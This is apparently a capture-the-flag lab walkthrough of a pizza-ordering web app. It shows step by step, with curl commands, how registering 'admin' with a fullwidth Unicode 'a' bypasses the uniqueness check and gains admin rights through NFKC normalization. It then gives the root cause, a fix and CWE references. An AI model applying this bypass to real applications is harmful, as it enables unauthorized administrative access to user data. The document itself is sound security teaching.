# cheesy-011 - BugForge Lab Walkthrough

**URL:** https://lab-1784122203152-ng0tv7.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** Unicode homoglyph authorization bypass (username uniqueness check vs normalized authorization check mismatch)
**Flag:** `bug{ZktKerGxWRgjpMrfMUyNuG0wR2HtZg3U}`

---

## Summary

Cheesy Does It is a React (CRA) and Express pizza ordering app with JWT auth. A seeded `admin` account already owns the username `admin`, so registering that username directly is blocked as a duplicate. The registration endpoint's uniqueness check compares raw byte strings, but a separate authorization check on the admin routes appears to normalize the username (a Unicode NFKC style fold) before comparing it to the literal string `admin`. Registering with a fullwidth Unicode "a" (U+FF41) in place of the ASCII "a" produces a username that is byte distinct, so it passes the uniqueness check, but folds back to `admin` under normalization, so it passes the authorization check too. The resulting account gets full access to every `/api/admin/*` endpoint despite its own profile and token verification endpoints still reporting a normal user role.

## Tech Stack

- Frontend: React (Create React App), static bundle, no exposed source map
- Backend: Express style REST API, JWT auth via `Authorization: Bearer` header
- The JWT itself carries no role claim, role is looked up server side per request
- Database seeded with an `admin` account (id 1) plus two ordinary users

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` | none | Fields: `username`, `email`, `password`, `confirmPassword`. Extra fields such as `role` are silently ignored |
| `POST /api/login` | none | Returns JWT |
| `GET /api/profile`, `GET /api/verify-token` | JWT | Always reflects the true database role |
| `GET /api/admin/users` | JWT, admin only | Vulnerable, accepted the homoglyph identity |
| `GET /api/admin/stats` | JWT, admin only | Flag delivered here via the `X-Flag` response header |
| `GET /api/admin/orders`, `/api/admin/coupons`, `/api/admin/tickets`, `/api/admin/tickets/:id` | JWT, admin only | All vulnerable |

## Attack Chain

### Step 1 - Enumerate the admin API surface

The React bundle has no exposed source map, but grepping the compiled JS directly for API path literals is enough:

```bash
curl -s "$TARGET/static/js/main.0de85fb7.js" -o /tmp/main.js
grep -oE '/api/[a-zA-Z0-9/_:${}.-]+' /tmp/main.js | sort -u
```

This reveals a full `/api/admin/*` surface (`users`, `stats`, `orders`, `coupons`, `tickets`) that never appears in any visible page for a normal user.

### Step 2 - Mass assignment on register is a dead end

```bash
curl -s -X POST $TARGET/api/register -H "Content-Type: application/json" \
  -d '{"username":"x","email":"x@evil.com","password":"P123!","confirmPassword":"P123!","role":"admin"}'
```

The account is created but `role` never persists. `/api/profile` still shows an ordinary user with no elevated access.

### Step 3 - Confirm the admin username is taken

```bash
curl -s -X POST $TARGET/api/register -H "Content-Type: application/json" \
  -d '{"username":"admin","email":"admin2@evil.com","password":"P123!","confirmPassword":"P123!"}'
```

```json
{"error":"Username or email already exists"}
```

The seeded `admin` account blocks a direct register.

### Step 4 - Homoglyph substitution

Several visually similar Unicode substitutions for the letter "a" were tried in the username `admin`: Cyrillic а (U+0430), Cyrillic і (U+0456) replacing the "i", Cyrillic м (U+043C) replacing the "m", Armenian ո (U+0578) replacing the "n", and Greek α (U+03B1). All of these registered successfully as new, distinct accounts, since the uniqueness check is byte based, but none of them granted admin access. These characters are visually close but have no formal Unicode normalization relationship to their Latin lookalikes.

The one substitution that worked was the fullwidth Unicode "a" (U+FF41), which is a Unicode compatibility character with a defined decomposition back to ASCII "a" under NFKC and NFKD normalization:

```python
uname = "ａdmin"   # looks like "admin"
# POST /api/register {"username": uname, "email": "...", "password": "...", "confirmPassword": "..."}
```

This registered as account id 20 with no collision.

### Step 5 - Confirm admin access

```bash
curl -s $TARGET/api/admin/users -H "Authorization: Bearer $TOKEN"
```

Returns a full 200 response with the entire user list, while `/api/profile` and `/api/verify-token` for the same token still report `"role":"user"`. Every other `/api/admin/*` endpoint behaves the same way.

### Step 6 - Locate the flag

None of the admin endpoint response bodies contain a flag field. Checking full response headers on an admin endpoint surfaces it instead:

```bash
curl -sD - $TARGET/api/admin/stats -H "Authorization: Bearer $TOKEN" -o /dev/null | grep -i x-flag
```

```
X-Flag: bug{ZktKerGxWRgjpMrfMUyNuG0wR2HtZg3U}
```

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| `role` / `isAdmin` / `admin` field in `POST /api/register` body | Fields silently ignored | Not every "become admin" bug in an app like this is mass assignment on register |
| Cyrillic а, Cyrillic і, Cyrillic м, Armenian ո, Greek α substitutions | Registered as distinct accounts, no elevated access | Visual similarity alone is not the same as Unicode normalization equivalence |
| Zero width space suffix, trailing dot, plain case variants (`Admin`, `ADMIN`) | Registered as distinct accounts, no elevated access | Simple `.trim()` or `.toLowerCase()` handling does not touch a normalization based check |
| `/api/admin/coupons/:id`, `/api/admin/users/:id` | Falls through to the SPA catch all (`text/html`, 200) | Not real backend routes, distinguish from the SPA fallback by content type |

## Root Cause

Two different code paths disagree on what counts as "the same username." Registration checks uniqueness against the raw string, while the admin authorization check appears to run the username through Unicode normalization before comparing it to the reserved name:

```javascript
// Uniqueness check (approximate)
if (await db.get('SELECT id FROM users WHERE username = ?', [rawUsername])) {
  return res.status(400).json({ error: 'Username or email already exists' });
}

// Authorization check (approximate)
const normalized = username.normalize('NFKC');
if (normalized === 'admin') {
  // grant admin capability
}
```

A Unicode compatibility character such as the fullwidth "a" is a different code point from the ASCII original, so it survives the first check, but normalizes back to the exact reserved string for the second. The fix is to normalize the username consistently before both the uniqueness check and any identity based authorization decision, or better, to stop making authorization decisions from a mutable username at all and use a stable role column looked up by primary key.

## CWE / OWASP

- **CWE-178**: Improper Handling of Case Sensitivity and Alternate Encodings
- **CWE-863**: Incorrect Authorization
- **OWASP A01:2021** - Broken Access Control
